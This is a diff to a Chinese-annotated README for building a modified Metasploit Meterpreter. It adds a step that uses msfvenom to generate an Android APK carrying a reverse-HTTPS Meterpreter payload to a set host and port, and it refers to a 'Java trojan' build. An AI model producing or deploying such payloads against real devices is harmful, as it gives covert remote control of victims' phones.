@@ -47,8 +47,12 @@ cp -r android /usr/share/metasploit-framework/data
 
 java木马：mvn -D deploy.path=/usr/share/metasploit-framework -P deploy package
 
-5.Next time you run `msfconsole`, you should see: `WARNING: Local files may be incompatible with the Metasploit Framework`.
-This means that msfconsole is now using your newly built version of the Java and Android Meterpreter :)
+5.通过msfvenom命令生成APK:
+msfvenom -p android/meterpreter_reverse_https  LHOST=10.10.10.102 LPORT=4444 -o payload.apk
+返回信息：如果开头出现了这三个WARNING，说明msfvenom生成APK时使用的是我们修改后的版本。 
+WARNING: Local file /usr/share/metasploit-framework/data/android/apk is being used
+WARNING: Local files may be incompatible with the Metasploit Framework
+WARNING: Local file /usr/share/metasploit-framework/data/android/apk/classes.dex is being used
 
 
 ## Building on OSX
